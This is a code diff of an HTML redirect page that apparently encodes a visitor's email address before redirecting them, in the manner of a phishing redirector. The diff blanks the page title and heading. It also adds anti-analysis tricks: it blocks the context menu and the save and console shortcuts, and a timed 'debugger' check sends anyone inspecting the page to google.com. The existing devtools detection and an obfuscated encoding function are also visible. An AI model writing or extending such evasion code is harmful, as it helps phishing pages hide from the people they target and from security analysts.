@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
+  <title>...</title>
   <script>
     function bIB(str, bits = 20) {
       const bitLength = Math.ceil(str.length / bits);
@@ -58,17 +58,32 @@
 
     setInterval(detectDevTools, 1000);
 
+    document.addEventListener("contextmenu", (e) => {
+      e.preventDefault();
+    });
+
     document.addEventListener("keydown", (e) => {
-      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U") || (e.ctrlKey && e.shiftKey && e.key === "C")) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U") || (e.ctrlKey && e.shiftKey && e.key === "C") || (e.ctrlKey && e.key === "S") || (e.ctrlKey && e.key === "J")) {
         e.preventDefault();
         window.location.href = "https://www.google.com";
       }
     });
 
+    function antiDebugging() {
+      const startTime = performance.now();
+      debugger;
+      const endTime = performance.now();
+      if (endTime - startTime > 100) {
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    setInterval(antiDebugging, 1000);
+
     encodeEmailAndRedirect();
   </script>
 </head>
 <body>
-  <h1>Redirecting...</h1>
+  <h1>...</h1>
 </body>
 </html>
